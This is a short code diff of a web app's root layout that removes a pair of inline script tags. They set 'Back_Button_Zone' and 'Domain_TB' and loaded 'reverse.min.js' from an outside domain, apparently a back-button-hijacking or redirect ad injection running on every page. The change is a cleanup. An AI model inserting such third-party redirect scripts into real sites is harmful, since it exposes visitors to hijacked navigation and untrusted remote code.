@@ -92,13 +92,6 @@ export default function RootLayout({
           document.head.appendChild(s);
         `}
         </Script>
-
-        {/* Add requested script tags */}
-        <script>
-          var Back_Button_Zone = 9272453;
-          var Domain_TB = "yovcb.com";
-        </script>
-        <script async src="https://desenteir.com/e30/8d8a0/reverse.min.js?sf=1"></script>
       </head>
       <body className={inter.className}>
         <StyledComponentsRegistry>
